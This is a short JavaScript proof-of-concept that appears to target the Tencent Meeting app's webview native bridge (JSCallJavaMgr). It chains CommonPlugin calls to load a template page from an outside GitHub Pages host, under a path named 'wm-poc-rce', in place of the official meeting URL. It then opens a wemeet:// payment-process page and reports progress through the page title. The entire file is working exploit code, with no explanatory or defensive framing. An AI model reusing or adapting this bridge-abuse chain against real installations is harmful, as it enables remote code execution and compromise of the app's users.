(function(){
  document.title='P134TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P134CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,80);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__p',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P134TB-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P134TB-NOMGR:'+location.host;return}
  var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
  var tpl='https://gitwhs.github.io/wm-poc-rce/p134tpl.html';
  var sch='wemeet://page/pay/main_process_webview';
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['LT','CommonPlugin','LoadTemplateWebView',{
      url:official,
      template_url:tpl,
      process_pattern:0
    }],
    ['OC','CommonPlugin','OnCacheWebviewCosume',{
      url:official,
      common_preload_url:official,
      template_url:tpl
    }],
    ['OP','CommonPlugin','OpenNewPage',{
      scheme:sch,
      router_params:{url:official}
    }]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P134TB-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P134-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 4000);
  }
  setTimeout(n, 800);
})();
